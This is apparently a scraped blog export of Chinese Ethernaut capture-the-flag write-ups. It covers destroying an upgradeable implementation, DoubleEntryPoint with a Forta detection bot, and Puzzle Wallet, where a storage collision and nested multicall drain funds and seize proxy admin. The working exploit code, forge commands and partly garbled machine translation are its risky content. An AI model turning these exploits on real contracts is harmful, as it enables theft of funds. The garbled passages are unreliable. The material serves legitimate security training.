这是将在方法内部发送的数据`upgradeToAndCall()`。- `engineAddress.upgradeToAndCall`- 最后，我们正在调用升级实施合同。该函数期望实现的地址作为第一个参数，包含函数签名的编码数据作为第二个参数在升级合约时调用。调用完成后，实施合约将更改为我们已部署的`Destructive`合约，当前实施将对`delegatecall()`我们的合约`killed()`功能产生影响，从而破坏合约。部署破坏性合约并使用以下命令执行脚本：复制 forge create Destructive --private-key $PKEY --rpc-url $RPC_URL forge script ./script/level25.sol --private-key $PKEY --broadcast --rpc-url $RPC_URL -vvvv &gt; 确保在漏洞利用脚本中更新破坏性合约的地址。 现在可以提交实例以完成关卡。 ## 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"DoubleEntryPoint","slug":"Smart contracts/ethernaut/DoubleEntryPoint","date":"2023-03-13T04:20:10.000Z","updated":"2023-03-13T04:20:10.000Z","comments":true,"path":"2023/03/13/Smart contracts/ethernaut/DoubleEntryPoint/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/13/Smart%20contracts/ethernaut/DoubleEntryPoint/","excerpt":"","text":"DoubleEntryPoint1. 题目要求 1.1 此级别具有CryptoVault特殊功能，sweepToken功能。这是用于检索卡在合约中的代币的常用函数。操作CryptoVault使用underlying无法清除的令牌，因为它是 . 的重要核心逻辑组件CryptoVault。可以清除任何其他令牌。 底层代币是合约定义中实施的 DET 代币的一个实例DoubleEntryPoint，并CryptoVault持有 100 个单位。此外，CryptoVault还拥有 100 个LegacyToken LGT。 在此级别中，您应该找出错误所在CryptoVault并防止它被耗尽令牌。 该合约具有Forta合约功能，任何用户都可以注册自己的detection bot合约。Forta 是一个去中心化的、基于社区的监控网络，用于尽快检测 DeFi、NFT、治理、桥梁和其他 Web3 系统上的威胁和异常。你的工作是实现一个detection bot并在合约中注册它Forta。机器人的实施将需要发出正确的警报，以防止潜在的攻击或漏洞利用。 可能有帮助的事情： 双入口点如何为代币合约工作？ 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import &quot;openzeppelin-contracts-08/access/Ownable.sol&quot;; import &quot;openzeppelin-contracts-08/token/ERC20/ERC20.sol&quot;; interface DelegateERC20 &#123; function delegateTransfer(address to, uint256 value, address origSender) external returns (bool); &#125; interface IDetectionBot &#123; function handleTransaction(address user, bytes calldata msgData) external; &#125; interface IForta &#123; function setDetectionBot(address detectionBotAddress) external; function notify(address user, bytes calldata msgData) external; function raiseAlert(address user) external; &#125; contract Forta is IForta &#123; mapping(address =&gt; IDetectionBot) public usersDetectionBots; mapping(address =&gt; uint256) public botRaisedAlerts; function setDetectionBot(address detectionBotAddress) external override &#123; usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress); &#125; function notify(address user, bytes calldata msgData) external override &#123; if(address(usersDetectionBots[user]) == address(0)) return; try usersDetectionBots[user].handleTransaction(user, msgData) &#123; return; &#125; catch &#123;&#125; &#125; function raiseAlert(address user) external override &#123; if(address(usersDetectionBots[user]) != msg.sender) return; botRaisedAlerts[msg.sender] += 1; &#125; &#125; contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#39;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125; &#125; contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125; &#125; contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor(address legacyToken, address vaultAddress, address fortaAddress, address playerAddress) &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if(forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125; &#125; 12345678910111213141516171819202122232425262728293031323334353637383940## 2. 分析- 这个挑战似乎是 OpenZeppelin 和 Forta 之间的合资企业，一个实时安全和操作监控。据我所知，试图向您解释您应该如何集成 Forta 系统来监控您的合同是一个挑战。让我们看看进展如何。 从挑战的描述（说实话不清楚）我们有两个令牌：`LegacyToken`顾名思义是一个已“弃用”的令牌（这在现实生活中发生过吗？）支持一个名为`DoubleEntryPoint`. 我们还有一个称为 Vault 的库`CryptoVault`，它具有一些功能（与挑战范围无关），并提供一种称为实用程序的方法，允许`sweepToken(IERC20 token)`任何人“扫描”（转移）到`sweptTokensRecipient`（部署时定义的地址）已发送的令牌不小心去了金库。该函数中唯一的检查是您不能扫除`underlying`Vault 的令牌。 在部署时，我们从这个配置开始： - `CryptoVault`持有**100 个 DET** ( `DoubleEntryToken`) - `CryptoVault`持有**100 LGT** ( `LegacyToken`) 我们的目标是创建一个**Forta DetectionBot**来监控合约并防止外部攻击者耗尽本`CryptoVault`不应耗尽的代币。 让我们回顾一下每个合同，看看我们是否能找到一些攻击媒介。 ### `LegacyToken.sol` ```solidity contract LegacyToken is ERC20(&quot;LegacyToken&quot;, &quot;LGT&quot;), Ownable &#123; DelegateERC20 public delegate; function mint(address to, uint256 amount) public onlyOwner &#123; _mint(to, amount); &#125; function delegateToNewContract(DelegateERC20 newContract) public onlyOwner &#123; delegate = newContract; &#125; function transfer(address to, uint256 value) public override returns (bool) &#123; if (address(delegate) == address(0)) &#123; return super.transfer(to, value); &#125; else &#123; return delegate.delegateTransfer(to, value, msg.sender); &#125; &#125; &#125; 它是一个`ERC20`继承自的令牌`Ownable`。合约`owner`的 可以通过调用`mint`新代币和更新变量的值。`delegate``delegateToNewContract` 奇怪的部分是在`transfer`覆盖了标准提供的默认函数的函数中`ERC20`。 如果没有定义委托（`address(delegate) == address(0)`），则合约使用标准的默认逻辑`ERC20`；否则执行`return delegate.delegateTransfer(to, value, msg.sender)`。 在这种情况下，`delegate`是`DoubleEntryPoint`合同本身。这是什么意思？当您在现实中执行转移时，`LegacyToken`它正在转发要执行的操作`DoubleEntryPoint.delegateTransfer`。让我们切换到另一个令牌代码，看看发生了什么 ### `DoubleEntryPoint.sol` 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849contract DoubleEntryPoint is ERC20(&quot;DoubleEntryPointToken&quot;, &quot;DET&quot;), DelegateERC20, Ownable &#123; address public cryptoVault; address public player; address public delegatedFrom; Forta public forta; constructor( address legacyToken, address vaultAddress, address fortaAddress, address playerAddress ) public &#123; delegatedFrom = legacyToken; forta = Forta(fortaAddress); player = playerAddress; cryptoVault = vaultAddress; _mint(cryptoVault, 100 ether); &#125; modifier onlyDelegateFrom() &#123; require(msg.sender == delegatedFrom, &quot;Not legacy contract&quot;); _; &#125; modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;); &#125; function delegateTransfer( address to, uint256 value, address origSender ) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true; &#125;&#125; 合约是`ERC20`继承自 和 的`DelegateERC20`普通代币`Ownable`。`DelegateERC20`是强制合约实现token`function delegateTransfer(address to, uint256 value, address origSender)`需要的功能的接口`LegacyToken`。 有时`constructor`，设置一些状态变量并将`100`令牌铸造到`CryptoVault`. 在进入`delegateTransfer`函数之前，让我们回顾一下`fortaNotify`函数修饰符 123456789101112131415modifier fortaNotify() &#123; address detectionBot = address(forta.usersDetectionBots(player)); // Cache old number of bot alerts uint256 previousValue = forta.botRaisedAlerts(detectionBot); // Notify Forta forta.notify(player, msg.data); // Continue execution _; // Check if alarms have been raised if (forta.botRaisedAlerts(detectionBot) &gt; previousValue) revert(&quot;Alert has been triggered, reverting&quot;);&#125; 这个修改器的作用是触发 Forta 检测系统实现的一些逻辑。**它在本地存储执行代码函数之前**引发的警报数量，并将该数字与执行调用函数修饰符的函数主体**之后**引发的警报数量进行比较。 如果警报数量增加，交易将**恢复**并显示消息`&quot;Alert has been triggered, reverting&quot;`。 让我们回顾一下调用`LegacyToken`“遗留”时令牌也使用的重要功能。`LegacyToken.transfer` 12345678function delegateTransfer( address to, uint256 value, address origSender) public override onlyDelegateFrom fortaNotify returns (bool) &#123; _transfer(origSender, to, value); return true;&#125; 如果查看函数修饰符列表，您会看到 - `onlyDelegateFrom`只允许`delegateFrom`调用此函数。在这种情况下，只`LegacyToken`允许合约调用此函数，否则将允许任何人调用`_transfer`（即低级 ERC20 传输）来自`origSender` - `fortaNotify`是一个特殊的功能修饰符，可以触发一些特定的 Forta 逻辑，就像我们之前看到的那样 函数本身很简单，就是调用函数的ERC20内部实现`_transfer`。请记住，`_transfer`只检查 that`to`和`origSender`are not`address(0)`以及`origSender`有足够的令牌可以转移到`to`（它还检查不足/溢出条件）但它不检查 that `origSender`is`msg.sender`或消费者是否有足够的津贴。这就是为什么我们有修饰符`onlyDelegateFrom`。 ### `CryptoVault.sol` 12345678910111213141516171819202122contract CryptoVault &#123; address public sweptTokensRecipient; IERC20 public underlying; constructor(address recipient) public &#123; sweptTokensRecipient = recipient; &#125; function setUnderlying(address latestToken) public &#123; require(address(underlying) == address(0), &quot;Already set&quot;); underlying = IERC20(latestToken); &#125; /* ... */ function sweepToken(IERC20 token) public &#123; require(token != underlying, &quot;Can&#x27;t transfer underlying token&quot;); token.transfer(sweptTokensRecipient, token.balanceOf(address(this))); &#125;&#125; 合约应实现普通加密 Vault 系统的逻辑。对于挑战的范围而言，这部分逻辑并不有趣。 由于任何金库也`CryptoVault`有一个基础令牌，在这种情况下是`DoubleEntryPoint`. 任何人都可以调用的函数`sweepToken`允许金库将任意`token`（指定为输入参数）的整个金库余额转移到`sweptTokensRecipient`. 收件人应该是安全的，因为它是由合同的部署者及时初始化的`constructor`。 从代码中可以看出，唯一完成的检查是防止 Vault 转移令牌`underlying`。 ### 通过部署 Forta DetectionBot 找到漏洞并阻止它 通过结合我们收集到的所有信息，您是否发现了我们可以利用的漏洞？回顾一下我们现有的知识： - `CryptoVault`的`underlying`令牌是`DoubleEntryPoint`。该合约提供了一个`sweepToken`在 Vault 中转移代币的方法，但它阻止了清除`DoubleEntryPoint`代币（因为它是`underlying`） - `DoubleEntryPoint`token 是一个 ERC20 令牌，它实现了一个`delegateTransfer`只能由`LegacyToken`令牌调用的自定义函数，并且由 Forta 通过执行函数修饰符来监控`fortaNotify`。该函数允许委托人将一定数量的代币从`origSpender`任意接收者转移 - `LegacyToken`是已“弃用”的 ERC20 令牌。当`transfer(address to, uint256 value)`函数被调用时`DoubleEntryPoint`，（令牌的“新版本”）`delegate.delegateTransfer(to, value, msg.sender)`被调用 问题在哪里？因为`LegacyToken.transfer`是“镜像”，`DoubleEntryPoint.transfer`这意味着当您要求尝试转移 1 个时，`LegacyToken`实际上您转移的是 1 个`DoubleEntryPoint`代币（为了能够做到这一点，您的余额中必须同时拥有这两个代币） 包含`CryptoVault`两个令牌中的 100 个，但`sweepToken`仅阻止`underlying` `DoubleEntryPoint`. 但是通过了解其工作原理，我们可以通过调用`LegacyToken`轻松扫除所有令牌。`DoubleEntryPoint``CryptoVault.sweep(address(legacyTokenContract))` 现在我们知道如何利用它，我们如何利用 Forta 集成来**防止**利用并恢复交易？我们可以构建一个扩展 Forta 的合约`IDetectionBot`并将其插入`DoubleEntryPoint`. 通过这样做，我们应该能够在 Vault`sweepToken`触发`LegacyToken.transfer`将触发`DoubleEntryPoint.delegateTransfer`将触发（在执行函数代码之前）函数`fortaNotify`修饰符时防止利用。是的，我知道执行链很深，但请耐心等待，我们明白了！ 合约`IDetectionBot`接口只有一个函数签名`function handleTransaction(address user, bytes calldata msgData) external;`，可以通过`DoubleEntryPoint.delegateTransfer`这些参数直接调用`forta.notify(player, msg.data)`。 只有在这两个条件都为真时，我们才会在内部`DetectionBot`发出警报： - 原始发件人（正在呼叫的人`DoubleEntryPoint.delegateTransfer`）是`CryptoVault` - 调用函数的签名（的前 4 个字节`calldata`）等于`delegateTransfer`签名 让我们`origSender`从中提取值`msgData`（请记住，在本例中，该参数值等于`msg.data`）。如果您查看“特殊变量和函数”部分下的[块和交易属性](https://docs.soliditylang.org/en/latest/units-and-global-variables.html#block-and-transaction-properties)`msg.data`的 Solidity 文档，您会看到这是一种代表**完整 calldata 的**`bytes calldata`数据类型。这是什么意思？在这些字节中，您将同时拥有函数选择器（4 个字节）和函数有效负载。 要提取参数，我们可以简单地使用`abi.decode`这样的`(address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address));`。一个重要的注意事项：我们假设在这些字节中，这些特定类型的三个值以这些特定顺序排列。我们正在做一个非常**艰难的假设**。这就是为什么我们需要将此信息与函数签名与强制执行这些类型和顺序要求的函数签名相匹配这一事实结合起来`delegateTransfer`。 1msgData`第二部分非常简单，我们只需通过合并前 4 个字节来重建调用签名，`bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]);`并将其与我们知道的正确签名进行比较`delegateTransfer`→`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ## 解决方案代码 让我们看看检测的整个代码`DetectionBot` 12345678910111213141516171819contract DetectionBot is IDetectionBot &#123; address private monitoredSource; bytes private monitoredSig; constructor(address _monitoredSource, bytes memory _monitoredSig) public &#123; monitoredSource = _monitoredSource; monitoredSig = _monitoredSig; &#125; function handleTransaction(address user, bytes calldata msgData) external override &#123; (address to, uint256 value, address origSender) = abi.decode(msgData[4:], (address, uint256, address)); bytes memory callSig = abi.encodePacked(msgData[0], msgData[1], msgData[2], msgData[3]); if (origSender == monitoredSource &amp;&amp; keccak256(callSig) == keccak256(monitoredSig)) &#123; IForta(msg.sender).raiseAlert(user); &#125; &#125;&#125; 在构造函数内部，第一个参数将是我们要监视的源，在本例中是地址，`CryptoVault`第二个参数是我们打算监视的函数的签名，在本例中是`abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;)`。 现在我们只需要部署传递正确参数的机器人并将机器人插入 Forta 系统并解决挑战。我们走吧！ 12345678910111213141516function exploitLevel() internal override &#123; vm.startPrank(player, player); // Create and deploy the `DetectionBot` with the correct constructor paramter // The first one is the source we want to monitor // The second one is the signature of the function we want to match DetectionBot bot = new DetectionBot( level.cryptoVault(), abi.encodeWithSignature(&quot;delegateTransfer(address,uint256,address)&quot;) ); // add the bot to the Forta network detection system that monitor the `DoubleEntryPoint` contract level.forta().setDetectionBot(address(bot)); vm.stopPrank();&#125; 3. 解题","categories":[{"name":"Smart contracts","slug":"Smart-contracts","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/"},{"name":"ethernaut","slug":"Smart-contracts/ethernaut","permalink":"https://biyouqiuqiu.com/categories/Smart-contracts/ethernaut/"}],"tags":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"靶场","slug":"靶场","permalink":"https://biyouqiuqiu.com/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"Puzzle Wallet","slug":"Smart contracts/ethernaut/Puzzle Wallet","date":"2023-03-12T04:10:10.000Z","updated":"2023-03-12T04:10:10.000Z","comments":true,"path":"2023/03/12/Smart contracts/ethernaut/Puzzle Wallet/","link":"","permalink":"https://biyouqiuqiu.com/2023/03/12/Smart%20contracts/ethernaut/Puzzle%20Wallet/","excerpt":"","text":"Puzzle Wallet（不会）1. 题目要求 1.1 Nowadays, paying for DeFi operations is impossible, fact. A group of friends discovered how to slightly decrease the cost of performing multiple transactions by batching them in one transaction, so they developed a smart contract for doing this. They needed this contract to be upgradeable in case the code contained a bug, and they also wanted to prevent people from outside the group from using it. To do so, they voted and assigned two people with special roles in the system: The admin, which has the power of updating the logic of the smart contract. The owner, which controls the whitelist of addresses allowed to use the contract. The contracts were deployed, and the group was whitelisted. Everyone cheered for their accomplishments against evil miners. Little did they know, their lunch money was at risk… You’ll need to hijack this wallet to become the admin of the proxy. Things that might help:: Understanding how delegatecalls work and how msg.sender and msg.value behaves when performing one. Knowing about proxy patterns and the way they handle storage variables. 1.2 题目代码： // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; pragma experimental ABIEncoderV2; import &quot;../helpers/UpgradeableProxy-08.sol&quot;; contract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor(address _admin, address _implementation, bytes memory _initData) UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125; &#125; contract PuzzleWallet &#123; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] += msg.value; &#125; function execute(address to, uint256 value, bytes calldata data) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] -= value; (bool success, ) = to.call&#123; value: value &#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125; &#125; 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768## 2. 分析#### tips: [参考博客](https://stermi.xyz/blog/ethernaut-challenge-23-solution-puzzle-wallet)如果您是代理世界的新手，我强烈建议您先阅读所有这些内容：- [OpenZeppelin 代理](https://docs.openzeppelin.com/contracts/4.x/api/proxy)- [OpenZeppelin 代理升级模式](https://docs.openzeppelin.com/upgrades-plugins/1.x/proxies)- [OpenZeppelin Transparent 与 UUPS 代理](https://docs.openzeppelin.com/contracts/4.x/api/proxy#transparent-vs-uups)- [（视频）OpenZeppelin 部署更高效的可升级合约](https://www.youtube.com/watch?v=kWUDTZhxKZI)- [（视频）OpenZeppelin # 智能合约升级的安全性](https://www.youtube.com/watch?v=5WE6PEc305w&amp;t=3945s)**⚠️ 重要 ⚠️**这只是关于代理如何工作的基本解释，如果您需要使用它们或在现实生活场景中实施，请自行研究。我会尝试在一个非常高的层次上解释它，所以请耐心等待。代理/实现模式背后的想法是有两个不同的合约，它们的行为如下：- 用户与 Proxy 合约交互，所有的“数据”都存储在这里。您可以将此合约视为前端。代理合约会将所有用户交互“转发”给实施合约- Proxy合约的所有实现都在Implementation合约中实现。这允许代理所有者在某个时候升级指向实施合约的“指针”，以防他想要修复错误或实施新功能。代理合约内部通常没有太多代码（只有管理升级/授权的代码）并且具有将`fallback`所有用户交互“转发”到包含该功能的实际实现的实现合约的功能。这种“转发”操作是通过`delegatecall`.在这一点上，我假设您已经知道 a 是如何`delegatecall`工作的，但如果您对所有这些都不熟悉，请阅读此内容- [Solidity 文档：Delegatecall / Callcode 和库](https://docs.soliditylang.org/en/latest/introduction-to-smart-contracts.html#delegatecall-callcode-and-libraries)- [Sigma Prime，Solidity Security：已知攻击媒介和常见反模式的综合列表：delegatecall](https://blog.sigmaprime.io/solidity-security.html#delegatecall)当通过函数`ContractA`调用`ContractB`的函数在代码上执行时，但整个**上下文**（和合约的存储）是来自.`implementation()``delegatecall``ContractB``msg.sender``msg.value``ContractA`要记住的一个关键概念是，如果`ContractB`代码在 a 期间更新合约的存储，`delegatecall`它不会**修改`ContractB`存储，而是修改`ContractA`存储！**`delegatecall`是一个强大的工具，但如果使用不当，它也非常复杂和危险。考虑到所有这些解释，让我们看看合同### `PuzzleProxy.sol````soliditycontract PuzzleProxy is UpgradeableProxy &#123; address public pendingAdmin; address public admin; constructor( address _admin, address _implementation, bytes memory _initData ) public UpgradeableProxy(_implementation, _initData) &#123; admin = _admin; &#125; modifier onlyAdmin() &#123; require(msg.sender == admin, &quot;Caller is not the admin&quot;); _; &#125; function proposeNewAdmin(address _newAdmin) external &#123; pendingAdmin = _newAdmin; &#125; function approveNewAdmin(address _expectedAdmin) external onlyAdmin &#123; require(pendingAdmin == _expectedAdmin, &quot;Expected new admin by the current admin is not the pending admin&quot;); admin = pendingAdmin; &#125; function upgradeTo(address _newImplementation) external onlyAdmin &#123; _upgradeTo(_newImplementation); &#125;&#125; 这是代理合约，每个用户将直接与这个合约交互，当函数（在 中实现）被执行时，它将把所有内容转发给合约PuzzleWallet。delegatecall``fallback``UpgradeableProxy fallback仅当上述函数均未被调用时才会执行该函数。 除了转发呼叫之外，该合约还处理角色admin，即创建角色以将代理“升级”到新的实现，以防需要修复错误或必须将新功能添加到合约中。 任何人都可以通过 提议新管理员proposeAdmin(address)，但只有当前管理员可以通过 批准新管理员approveNewAdmin。 PuzzleWallet.sol1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162contract PuzzleWallet &#123; using SafeMath for uint256; address public owner; uint256 public maxBalance; mapping(address =&gt; bool) public whitelisted; mapping(address =&gt; uint256) public balances; function init(uint256 _maxBalance) public &#123; require(maxBalance == 0, &quot;Already initialized&quot;); maxBalance = _maxBalance; owner = msg.sender; &#125; modifier onlyWhitelisted() &#123; require(whitelisted[msg.sender], &quot;Not whitelisted&quot;); _; &#125; function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance; &#125; function addToWhitelist(address addr) external &#123; require(msg.sender == owner, &quot;Not the owner&quot;); whitelisted[addr] = true; &#125; function deposit() external payable onlyWhitelisted &#123; require(address(this).balance &lt;= maxBalance, &quot;Max balance reached&quot;); balances[msg.sender] = balances[msg.sender].add(msg.value); &#125; function execute( address to, uint256 value, bytes calldata data ) external payable onlyWhitelisted &#123; require(balances[msg.sender] &gt;= value, &quot;Insufficient balance&quot;); balances[msg.sender] = balances[msg.sender].sub(value); (bool success, ) = to.call&#123;value: value&#125;(data); require(success, &quot;Execution failed&quot;); &#125; function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125; &#125;&#125; 这是一份很长的合同，但重要的部分在这里。 为了进行execute交易，您必须在whitelisted映射中。与请求发送到的请求相比，只有execute余额msg.sender( )balances[msg.sender]``value``to whitelisted只能通过owner合约的将用户添加到映射中 白名单用户可以调用deposit将 ETH 存入合约并更新余额 支付更少的gas交易可以通过multicall函数批量执行 multicall函数只允许将一个 deposit呼叫添加到批处理呼叫列表的列表中。这样做是为了防止有人通过发送 X 数量的 ETH但在批处理交易列表中multicall多次调用deposit 利用合同在审查代码之后，你是否至少发现了一些问题在哪里？我会给你一些提示： 合约和代理的布局存储 合同执行期间的上下文delegatecall 好的，让我们进入兔子洞。 首先，PuzzleProxy不要PuzzleWallet有相同的布局存储。这意味着当它在fromPuzzleWallet期间执行某些代码时修改状态变量时，它可能会无意中更改错误变量的值。delegatecall``PuzzleProxy 让我们举个例子。我调用PuzzleProxy.proposeNewAdmin(player)提议player地址作为代理合约的新管理员。该proposeNewAdmin函数更新pendingAdmin位于**.slot 0**中的变量PuzzleProxy。 你知道合约的Slot 0里有什么吗PuzzleWallet？变量address public owner！你知道这是什么意思吗？这意味着当通过fromPuzzleWallet执行函数时，现在是!delegatecall``PuzzleProxy``pendingAdmin``owner 所以现在我们是的owner，PuzzleWallet但我们的最终目标是成为admin的PuzzleProxy。我们可以利用相同的漏洞利用，为此我们必须找到一种方法让a执行时PuzzleWallet修改布局存储的Slot 1 。delegatecall 在合约的Slot 1PuzzleWallet上，有maxBalance变量。我们只需要通过将 Player 地址转换为整数来更新该值uint256(player)。 修改该变量的唯一函数是setMaxBalance只能由白名单用户调用并且当合约余额为 0 时调用。 我们现在是合约的所有者（由于漏洞利用），因此我们可以通过调用将自己添加到白名单中，addToWhitelist但我们仍然需要解决余额问题。 我们现在终于可以打电话了吗setMaxBalance(uint256(player))？没有！ 1234function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted &#123; require(address(this).balance == 0, &quot;Contract balance is not 0&quot;); maxBalance = _maxBalance;&#125; 如果您查看代码，如果合约中有任何余额并且合约是0.001 ether由部署者在部署方资助的，交易将恢复。 要完成挑战并成为代理人，我们必须通过调用并使用该余额admin来耗尽合约。问题是 execute 只会使用用户的余额，如果它等于并且我们无法利用该机制。execute``0.001 ether``msg.sender 我们不能依赖deposit，因为即使我们存入一些东西然后调用execute我们也不能使用超过我们存入的东西。那么现在怎么办？ 让我们看一下multicall功能代码，看看那里是否有我们可以利用的东西 1234567891011121314151617function multicall(bytes[] calldata data) external payable onlyWhitelisted &#123; bool depositCalled = false; for (uint256 i = 0; i &lt; data.length; i++) &#123; bytes memory _data = data[i]; bytes4 selector; assembly &#123; selector := mload(add(_data, 32)) &#125; if (selector == this.deposit.selector) &#123; require(!depositCalled, &quot;Deposit can only be called once&quot;); // Protect against reusing msg.value depositCalled = true; &#125; (bool success, ) = address(this).delegatecall(data[i]); require(success, &quot;Error while delegating call&quot;); &#125;&#125; 该函数允许用户将多个调用一起批处理以节省一些 gas，并且如您所见，它有一个检查以允许deposit在批处理调用中只允许一个调用。需要进行此检查以防止有人在发送一些以太币时添加多个deposit。如果没有该支票，您将能够对发送的以太币进行双重计算。 例如，如果我发送了1 ether两笔存款，在交易结束时，balances[msg.sender]将等于2 etherwhile I’ve sent only 1 ether。 那么，我们如何利用它呢？虽然我们确实不能将两个存款放在一个里面multicall，但如果我们可以将一个deposit然后另一个放在deposit另一个里面呢multicall？ 多呼叫开始！ 让我们准备multicall通话 123456789101112bytes[] memory callsDeep = new bytes[](1);callsDeep[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);bytes[] memory calls = new bytes[](2);calls[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);calls[1] = abi.encodeWithSelector(PuzzleWallet.multicall.selector, callsDeep);puzzleWallet.multicall&#123;value: 0.001 ether&#125;(calls);// At this point inside the contract there are 0.002 ether (one is from us and one from the PuzzleWalletFactory)// But `balances[player]` is equal to 0.002 ether!// We are able to call the `execute` method in a way that will send to us the whole contract&#x27;s balancepuzzleWallet.execute(player, 0.002 ether, &quot;&quot;); 在execute我们成功地从合约中移除所有以太币余额（并获得0.001免费以太币）之后，我们可以调用puzzleWallet.setMaxBalance(uint256(player)); 通过这样做，我们现在是合同的管理员PuzzleProxy！ 解决方案代码让我们回顾一下我们需要做什么来解决这个挑战 通过调用成为proposeNewAdmin(player)所有者PuzzleWallet``delegatecall 现在我们是所有者（当PuzzleWallet通过访问时delegatecall）我们可以通过以下方式将自己添加到白名单用户列表中addToWhitelist(player); 构建一个批量调用有效负载，以便能够存入0.001 ether但让合约0.002 